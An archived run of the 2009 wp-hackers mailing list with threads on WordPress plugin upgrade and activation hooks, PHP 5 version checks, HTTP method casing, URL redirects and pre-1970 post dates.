> While it would be convenient to have an extra parameter or something, I
> think the idea was to simulate the "correct" manual upgrade procedure. That
> is, disable the plugin, upload the update, then enable it again. This is
> essentially what happens when you use the auto-upgrader, except that you
> don't have to do any of it manually.
> One possible way to keep track of updates, first time installs, and simple
> disable/enable actions is to use an option that contains the current version
> number. Then when the plugin is enabled you check the version in the
> database. If the option doesn't exist, the plugin has most likely just been
> installed. If it exists, but is an older version, an update has most likely
> been done. If it's the same version, then the user probably just disabled
> the plugin and then enabled it again without making any changes.
> I can't see any issues with what I just described, but if I'm off base in
> any way, by all means, fire away!
>
>
> --
> Will Anderson
> http://www.itsananderson.com/
>

From jeremy at visser.name  Fri Jul 17 00:06:54 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Fri, 17 Jul 2009 10:06:54 +1000
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>
Message-ID: <1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>

On Thu, 2009-07-16 at 14:42 +0100, John Blackbourn wrote:
> By not explicitly uppercasing the method you then allow for methods
> (other than post and head in this situation) that may actually be case
> sensitive.
> 
> Is this overengineering?

Well, why not strtoupper() it like Matt suggested before?


From wp-hackers at striderweb.com  Fri Jul 17 00:59:30 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 16 Jul 2009 19:59:30 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
	<4A5EE8D5.3010808@yoast.com>
	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
	<4A5F5136.7040100@xavisys.com>
	<6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>
Message-ID: <6B300C72-9A86-4BBE-80C6-D3DED2A52341@striderweb.com>


On Jul 16, 2009, at 1:31 PM, Will Anderson wrote:

> While it would be convenient to have an extra parameter or  
> something, I
> think the idea was to simulate the "correct" manual upgrade  
> procedure. That
> is, disable the plugin, upload the update, then enable it again.  
> This is
> essentially what happens when you use the auto-upgrader, except that  
> you
> don't have to do any of it manually.

Except that doing it manually, the deactivation hook runs when you  
deactivate.  So actually the auto-update is completely unlike any  
other form of updating.

Stephen

From lynne.pope at gmail.com  Fri Jul 17 01:53:42 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Fri, 17 Jul 2009 13:53:42 +1200
Subject: [wp-hackers] My Plugin Breaks Posting
In-Reply-To: <e9f3ce460907161508h1992bec6sd7f7bf7d981c9fe9@mail.gmail.com>
References: <e9f3ce460907161508h1992bec6sd7f7bf7d981c9fe9@mail.gmail.com>
Message-ID: <427667db0907161853w60228b07jf2cd7578522504b5@mail.gmail.com>

2009/7/17 Alex Andrews <awgandrews at gmail.com>

> Hey all,
>
> The plugin I am developing breaks posting. I have little idea how so I
> am wondering if someone has any idea what it may be. Turned off adding
> a new post works fine. Turned off I get the following error message:
>
> Your attempt to edit this post: ?hdfghsrhdgf? has failed.
>
> Please try again.
>
> I'm baffled to what could be the reason for this. I've ensured that no
> variable conflicts with the normal functions of Wordpress, the only
> thing I can think of is something in the admin functions.


I hit a similar thing when I tested 2.8.1 and it was the admin_init that was
causing issues.

westi posted this a couple of days ago - it might help
http://westi.wordpress.com/2009/07/15/making-your-broken-plugin-work-again-with-wordpress-2-8-1/

Lynne

From wp-hackers at itsananderson.com  Fri Jul 17 01:57:05 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Thu, 16 Jul 2009 21:57:05 -0400
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <6B300C72-9A86-4BBE-80C6-D3DED2A52341@striderweb.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
	<4A5EE8D5.3010808@yoast.com>
	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
	<4A5F5136.7040100@xavisys.com>
	<6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>
	<6B300C72-9A86-4BBE-80C6-D3DED2A52341@striderweb.com>
Message-ID: <6dbcd2670907161857q1a49a9c7i616eea661cdaa418@mail.gmail.com>

Actually, if you look at line 403 of
/wp-admin/includes/class-wp-upgrader.php you'll see that a filter is added
which calls a function do deactivate the plugin before it is upgraded. So
the upgrader in fact does exactly what I described as the manual process :)
-- 
Will Anderson
http://www.itsananderson.com/

On Thu, Jul 16, 2009 at 8:59 PM, Stephen Rider <wp-hackers at striderweb.com>wrote:

>
> On Jul 16, 2009, at 1:31 PM, Will Anderson wrote:
>
>  While it would be convenient to have an extra parameter or something, I
>> think the idea was to simulate the "correct" manual upgrade procedure.
>> That
>> is, disable the plugin, upload the update, then enable it again. This is
>> essentially what happens when you use the auto-upgrader, except that you
>> don't have to do any of it manually.
>>
>
> Except that doing it manually, the deactivation hook runs when you
> deactivate.  So actually the auto-update is completely unlike any other form
> of updating.
>
> Stephen
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From aaron at xavisys.com  Fri Jul 17 02:06:47 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Thu, 16 Jul 2009 19:06:47 -0700
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <6dbcd2670907161857q1a49a9c7i616eea661cdaa418@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>	<4A5DFD83.7000902@xavisys.com>	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>	<4A5EE8D5.3010808@yoast.com>	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>	<4A5F5136.7040100@xavisys.com>	<6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>	<6B300C72-9A86-4BBE-80C6-D3DED2A52341@striderweb.com>
	<6dbcd2670907161857q1a49a9c7i616eea661cdaa418@mail.gmail.com>
Message-ID: <4A5FDCB7.5030109@xavisys.com>

It doesn't deactivate the plugin normally though, it attempts to 
"Deactivate the plugin silently" and "Prevent deactivation hooks from 
running." Which means that the plugin is deactivated, but the plugin 
isn't TOLD that it was deactivated.

I assume this is because some plugins uninstall themselves when they are 
deactivated and that's not what was wanted.

Will Anderson wrote:
> Actually, if you look at line 403 of
> /wp-admin/includes/class-wp-upgrader.php you'll see that a filter is added
> which calls a function do deactivate the plugin before it is upgraded. So
> the upgrader in fact does exactly what I described as the manual process :)
>   

From wp-hackers at itsananderson.com  Fri Jul 17 02:11:53 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Thu, 16 Jul 2009 22:11:53 -0400
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5FDCB7.5030109@xavisys.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>
	<AD713840-A36D-4A07-904A-128229783526@striderweb.com>
	<4A5EE8D5.3010808@yoast.com>
	<349fe48b0907160304s781ec0cen36853b93b79d7ffe@mail.gmail.com>
	<4A5F5136.7040100@xavisys.com>
	<6dbcd2670907161131l404c5f2fm3b1a0941ebd4b787@mail.gmail.com>
	<6B300C72-9A86-4BBE-80C6-D3DED2A52341@striderweb.com>
	<6dbcd2670907161857q1a49a9c7i616eea661cdaa418@mail.gmail.com>
	<4A5FDCB7.5030109@xavisys.com>
Message-ID: <6dbcd2670907161911r28d61990n234e51c017de8bb2@mail.gmail.com>

I hadn't noticed that comment. I stand corrected.

On Thu, Jul 16, 2009 at 10:06 PM, Aaron D. Campbell <aaron at xavisys.com>wrote:

> It doesn't deactivate the plugin normally though, it attempts to
> "Deactivate the plugin silently" and "Prevent deactivation hooks from
> running." Which means that the plugin is deactivated, but the plugin isn't
> TOLD that it was deactivated.
>
> I assume this is because some plugins uninstall themselves when they are
> deactivated and that's not what was wanted.
>
> Will Anderson wrote:
>
>> Actually, if you look at line 403 of
>> /wp-admin/includes/class-wp-upgrader.php you'll see that a filter is added
>> which calls a function do deactivate the plugin before it is upgraded. So
>> the upgrader in fact does exactly what I described as the manual process
>> :)
>>
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Fri Jul 17 06:15:48 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 17 Jul 2009 07:15:48 +0100
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>
	<1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>
Message-ID: <67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>


On 17 Jul 2009, at 01:06, Jeremy Visser wrote:

> On Thu, 2009-07-16 at 14:42 +0100, John Blackbourn wrote:
>> By not explicitly uppercasing the method you then allow for methods
>> (other than post and head in this situation) that may actually be  
>> case
>> sensitive.
>>
>> Is this overengineering?
>
> Well, why not strtoupper() it like Matt suggested before?
>

A I said earlier in the thread the HTTP method argument is case- 
sensitive so we should not strtoupper every method.

However, it does seem to be common practise to allow for at least post  
and get to be specified lower case to an API and get sent upper case  
out over the wire.

We should support that
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From awgandrews at gmail.com  Fri Jul 17 07:50:39 2009
From: awgandrews at gmail.com (Alex Andrews)
Date: Fri, 17 Jul 2009 08:50:39 +0100
Subject: [wp-hackers] My Plugin Breaks Posting
In-Reply-To: <427667db0907161853w60228b07jf2cd7578522504b5@mail.gmail.com>
References: <e9f3ce460907161508h1992bec6sd7f7bf7d981c9fe9@mail.gmail.com> 
	<427667db0907161853w60228b07jf2cd7578522504b5@mail.gmail.com>
Message-ID: <e9f3ce460907170050x417895ebve10a27aee8db9650@mail.gmail.com>

Hi,

Thanks for the link. I already use admin_menu as opposed to admin_init
- http://github.com/recordsonribs/ribcage/blob/525adece9855040a066aebeca9f5c50b376f0855/admin.php

Could the problem be my use of $_REQUEST to pass actions to the
administration pages of the plugin, as opposed to using
admin_action_my_action to process this? How does
admin_action_my_action work? Initially I thought this may be the case,
as the variable ribcage_action on the following was previously called
action. The plugin works, it add artists as it is supposed to, but is
this use conflicted with core functions in some way.

http://github.com/recordsonribs/ribcage/blob/525adece9855040a066aebeca9f5c50b376f0855/admin/manage.php

All the best

Alex

2009/7/17 Lynne Pope <lynne.pope at gmail.com>:
> 2009/7/17 Alex Andrews <awgandrews at gmail.com>
>
>> Hey all,
>>
>> The plugin I am developing breaks posting. I have little idea how so I
>> am wondering if someone has any idea what it may be. Turned off adding
>> a new post works fine. Turned off I get the following error message:
>>
>> Your attempt to edit this post: ?hdfghsrhdgf? has failed.
>>
>> Please try again.
>>
>> I'm baffled to what could be the reason for this. I've ensured that no
>> variable conflicts with the normal functions of Wordpress, the only
>> thing I can think of is something in the admin functions.
>
>
> I hit a similar thing when I tested 2.8.1 and it was the admin_init that was
> causing issues.
>
> westi posted this a couple of days ago - it might help
> http://westi.wordpress.com/2009/07/15/making-your-broken-plugin-work-again-with-wordpress-2-8-1/
>
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremy at visser.name  Fri Jul 17 07:52:47 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Fri, 17 Jul 2009 17:52:47 +1000
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>
	<1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>
	<67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>
Message-ID: <1247817167.12878.6.camel@rillian.narnia.sunriseroad.net>

On Fri, 2009-07-17 at 07:15 +0100, Peter Westwood wrote:
> A I said earlier in the thread the HTTP method argument is case- 
> sensitive so we should not strtoupper every method.

Oh, whoops -- pardon me. I misread it as case-insensitive.

Had it been the case that it was case-insensitive, my comment would have
been valid, but I now see it was completely pointless and misguided.
Sorry for the noise.


From scribu at gmail.com  Fri Jul 17 10:31:28 2009
From: scribu at gmail.com (scribu)
Date: Fri, 17 Jul 2009 13:31:28 +0300
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <bcf8d3150907161636n58575ea8tb2e74d03329193fa@mail.gmail.com>
References: <58410e2e0907161617y4838c92fjc2dc244b207c7e69@mail.gmail.com>
	<bcf8d3150907161636n58575ea8tb2e74d03329193fa@mail.gmail.com>
Message-ID: <349fe48b0907170331h5584c463wba7cdd9ee999eb59@mail.gmail.com>

Actually, I think you need this plugin:

http://www.deanlee.cn/wordpress/permalinks-migration-plugin/

It works great on my site.


On Fri, Jul 17, 2009 at 2:36 AM, James Collins <james at om4.com.au> wrote:

> Hi Bryan,
> I would use the redirection plugin (
> http://wordpress.org/extend/plugins/redirection/) to achieve this.
>
> Much easier than modifying your .htaccess file.
>
> Regards,
>
> James Collins
>
> OM4 - Website Design and Development
> OM4.com.au | OM4Tourism.com
>
>
>
> 2009/7/17 Bryan Harley <bryanharley at gmail.com>
>
> > I have one type of URL that I want to 301 redirect to another.  Can
> > anyone help me write the mod_rewrite rule that can accomplish this?
> >
> > http://www.domain.com/category/postid-post-name.html
> >
> > http://www.domain.com/post-name/
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From wp-hackers at striderweb.com  Fri Jul 17 13:01:31 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Fri, 17 Jul 2009 08:01:31 -0500
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <427667db0907151904p4544e56cy1826316c0d95e1a5@mail.gmail.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
	<427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com>
	<4A5E83A5.5000407@duechiacchiere.it>
	<427667db0907151904p4544e56cy1826316c0d95e1a5@mail.gmail.com>
Message-ID: <A155620F-989F-4E8C-A2F1-8154072DAC22@striderweb.com>

Yeah that's exactly what they said in 1970 when they were busy  
programming 2-digit years.

On Jul 15, 2009, at 9:04 PM, Lynne Pope wrote:

> 29 years is more than a lifetime in technology.
>
> 2009/7/16 Dino Termini <dino at duechiacchiere.it>
>
>> Does this mean that Wordpress will stop working in 2070? I mean, I  
>> won't be
>> probably alive by that time, but just for curiosity... or even  
>> worse, in
>> 2038 [1]?
>>
>> [1] http://en.wikipedia.org/wiki/Year_2038_problem


From foolistbar at googlemail.com  Fri Jul 17 21:11:13 2009
From: foolistbar at googlemail.com (Geoffrey Sneddon)
Date: Fri, 17 Jul 2009 23:11:13 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
Message-ID: <7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>


On 14 Jul 2009, at 22:41, Otto wrote:

> Don't rely on users, they're invariably idiots. ;)
>
> Make your plugin smarter instead.
>
> /**
> * plugin_activation_check()
> *
> * Replace "plugin" with the name of your plugin
> */
> function plugin_activation_check(){
> 	if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> 		deactivate_plugins(basename(__FILE__)); // Deactivate ourself
> 		wp_die("Sorry, but you can't run this plugin, it requires PHP 5 or  
> higher.");
> 	}
> }
> register_activation_hook(__FILE__, 'plugin_activation_check');

But if you use PHP 5 only syntax, you'll have a fatal error thrown and  
thus that code will never be executed.

From scribu at gmail.com  Fri Jul 17 21:15:52 2009
From: scribu at gmail.com (scribu)
Date: Sat, 18 Jul 2009 00:15:52 +0300
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
Message-ID: <349fe48b0907171415y5c9ca966s6cc566543b506855@mail.gmail.com>

On Sat, Jul 18, 2009 at 12:11 AM, Geoffrey Sneddon <
foolistbar at googlemail.com> wrote:

>
> /**
>> * plugin_activation_check()
>> *
>> * Replace "plugin" with the name of your plugin
>> */
>> function plugin_activation_check(){
>>        if (version_compare(PHP_VERSION, '5.0.0', '<')) {
>>                deactivate_plugins(basename(__FILE__)); // Deactivate
>> ourself
>>                wp_die("Sorry, but you can't run this plugin, it requires
>> PHP 5 or higher.");
>>        }
>> }
>> register_activation_hook(__FILE__, 'plugin_activation_check');
>>
>
> But if you use PHP 5 only syntax, you'll have a fatal error thrown and thus
> that code will never be executed.
>


Supporting PHP4 is a huge pita. Having said that,

You could place the code with PHP5 syntax in a separate file and include it
only after you've done the above check.


-- 
http://scribu.net

From john.ivar.myrstad at gmail.com  Fri Jul 17 21:25:58 2009
From: john.ivar.myrstad at gmail.com (John Myrstad)
Date: Fri, 17 Jul 2009 23:25:58 +0200
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <A155620F-989F-4E8C-A2F1-8154072DAC22@striderweb.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
	<427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com>
	<4A5E83A5.5000407@duechiacchiere.it>
	<427667db0907151904p4544e56cy1826316c0d95e1a5@mail.gmail.com>
	<A155620F-989F-4E8C-A2F1-8154072DAC22@striderweb.com>
Message-ID: <d29aad6e0907171425j7a31a3cdj7e137379ee7269a0@mail.gmail.com>

Ok, as I understand theres a solution using ADOdb Library to deal with the
problem
http://wordpress.org/support/topic/27367?replies=23

Does anyone have a ADOdb patched 2.8(1) to share ?

John Myrstad

From otto at ottodestruct.com  Fri Jul 17 21:29:43 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 17 Jul 2009 16:29:43 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com> 
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
Message-ID: <161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>

On Fri, Jul 17, 2009 at 4:11 PM, Geoffrey
Sneddon<foolistbar at googlemail.com> wrote:
> But if you use PHP 5 only syntax, you'll have a fatal error thrown and thus
> that code will never be executed.

None of that syntax is PHP 5 only. And you won't get a fatal error
until you actually try to use the PHP 5 code in the plugin. Just
having it there doesn't make it go fatal until it tries to actually
interpret it.

Since the plugin deactivates itself on activation, the only way you
can go fatal is if you have actual PHP 5 code in the main body of the
plugin (instead of in a function or something).

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Fri Jul 17 21:39:20 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 17 Jul 2009 16:39:20 -0500
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
Message-ID: <161617690907171439l2b30a198ubb822e3b05e0df97@mail.gmail.com>

That was only on old PHP versions on Windows machines. On Linux boxes,
PHP should support 1901-2038. PHP 5.10 and up contains fixes for this,
I think.

However, yes, it's still limited to 2038 due to 32-bit dates.  The
standard method of working around this is to use ADOdb's time
functions, or the Pear Date library, both of which use 64-bit dates.

-Otto
Sent from Memphis, TN, United States


On Wed, Jul 15, 2009 at 4:23 PM, John
Myrstad<john.ivar.myrstad at gmail.com> wrote:
> When using the Simili timeline in WordPress its not possible to have posts
> older than 1.1.1970. As I understand this is a PHP issue, but are there any
> workarounds or hacks that may remove the limit ? As I understand its done
> with MovableType or TextPattern.
>
> http://www.simile-widgets.org/timeline/
> http://wordpress.org/extend/plugins/wp-simile-timeline/
>
> John Myrstad
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Fri Jul 17 21:41:05 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 17 Jul 2009 16:41:05 -0500
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <161617690907171439l2b30a198ubb822e3b05e0df97@mail.gmail.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com> 
	<161617690907171439l2b30a198ubb822e3b05e0df97@mail.gmail.com>
Message-ID: <161617690907171441v523b4822p237635f93bfb6195@mail.gmail.com>

Correction: PHP 5.2 and up supports pre-1970 and post-2038 dates using
the DateTime classes. Old behavior in date() and such is still there.

http://us.php.net/manual/en/class.datetime.php

-Otto
Sent from Memphis, TN, United States


On Fri, Jul 17, 2009 at 4:39 PM, Otto<otto at ottodestruct.com> wrote:
> That was only on old PHP versions on Windows machines. On Linux boxes,
> PHP should support 1901-2038. PHP 5.10 and up contains fixes for this,
> I think.
>
> However, yes, it's still limited to 2038 due to 32-bit dates. ?The
> standard method of working around this is to use ADOdb's time
> functions, or the Pear Date library, both of which use 64-bit dates.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Wed, Jul 15, 2009 at 4:23 PM, John
> Myrstad<john.ivar.myrstad at gmail.com> wrote:
>> When using the Simili timeline in WordPress its not possible to have posts
>> older than 1.1.1970. As I understand this is a PHP issue, but are there any
>> workarounds or hacks that may remove the limit ? As I understand its done
>> with MovableType or TextPattern.
>>
>> http://www.simile-widgets.org/timeline/
>> http://wordpress.org/extend/plugins/wp-simile-timeline/
>>
>> John Myrstad
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>

From gaarai at gaarai.com  Sat Jul 18 02:41:53 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 17 Jul 2009 21:41:53 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
Message-ID: <4A613671.8090104@gaarai.com>

In other words, you could create a small base plugin file that contained 
the plugin meta-data to register the plugin and contained nothing more 
than the version check as Otto described. If the version check passes, 
load the necessary code from another file included with the plugin.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/



Otto wrote:
> On Fri, Jul 17, 2009 at 4:11 PM, Geoffrey
> Sneddon<foolistbar at googlemail.com> wrote:
>   
>> But if you use PHP 5 only syntax, you'll have a fatal error thrown and thus
>> that code will never be executed.
>>     
>
> None of that syntax is PHP 5 only. And you won't get a fatal error
> until you actually try to use the PHP 5 code in the plugin. Just
> having it there doesn't make it go fatal until it tries to actually
> interpret it.
>
> Since the plugin deactivates itself on activation, the only way you
> can go fatal is if you have actual PHP 5 code in the main body of the
> plugin (instead of in a function or something).
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From aaron at xavisys.com  Sat Jul 18 02:45:22 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Fri, 17 Jul 2009 19:45:22 -0700
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A613671.8090104@gaarai.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com>
Message-ID: <4A613742.2040206@xavisys.com>

No offense to the PHP 4 users out there, but it's not worth the hassle.

Chris Jean wrote:
> In other words, you could create a small base plugin file that 
> contained the plugin meta-data to register the plugin and contained 
> nothing more than the version check as Otto described. If the version 
> check passes, load the necessary code from another file included with 
> the plugin.
>
> Chris Jean


From gaarai at gaarai.com  Sat Jul 18 02:49:40 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 17 Jul 2009 21:49:40 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A613742.2040206@xavisys.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>	<4A613671.8090104@gaarai.com>
	<4A613742.2040206@xavisys.com>
Message-ID: <4A613844.6020603@gaarai.com>

If you are to ask my opinion, it's really not difficult to make things 
PHP4 and PHP5 compatible. I do it each day, and it only requires a 
little bit of thought while coding to prevent issues. I simply posted 
what I did in case others wanted to provide a good failover mechanism in 
case they must be PHP5 only.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/



Aaron D. Campbell wrote:
> No offense to the PHP 4 users out there, but it's not worth the hassle.
>
> Chris Jean wrote:
>> In other words, you could create a small base plugin file that 
>> contained the plugin meta-data to register the plugin and contained 
>> nothing more than the version check as Otto described. If the version 
>> check passes, load the necessary code from another file included with 
>> the plugin.
>>
>> Chris Jean
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp at xentek.net  Sat Jul 18 05:43:57 2009
From: wp at xentek.net (Eric Marden)
Date: Sat, 18 Jul 2009 01:43:57 -0400
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
In-Reply-To: <4A5EE9CF.2000508@yoast.com>
References: <45c7e0790907151246i4af8edefocf0d6c2e552d61a9@mail.gmail.com>
	<4A5EE9CF.2000508@yoast.com>
Message-ID: <D078423E-B0B4-4F63-9C3B-2EBC05C7AB92@xentek.net>

> However that doesn't seem to be what you want, if you want to  
> reliably measure how many people read your feed through a  
> feedreader, I can only say one thing: forget it. FeedBurner is FAR  
> from reliable these days.


I think the worst is behind us. The service seems to be getting better  
now that the google tentacles are done burrowing into the service. :)


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From bryanharley at gmail.com  Sun Jul 19 04:54:01 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Sat, 18 Jul 2009 21:54:01 -0700
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <349fe48b0907170331h5584c463wba7cdd9ee999eb59@mail.gmail.com>
References: <58410e2e0907161617y4838c92fjc2dc244b207c7e69@mail.gmail.com>
	<bcf8d3150907161636n58575ea8tb2e74d03329193fa@mail.gmail.com>
	<349fe48b0907170331h5584c463wba7cdd9ee999eb59@mail.gmail.com>
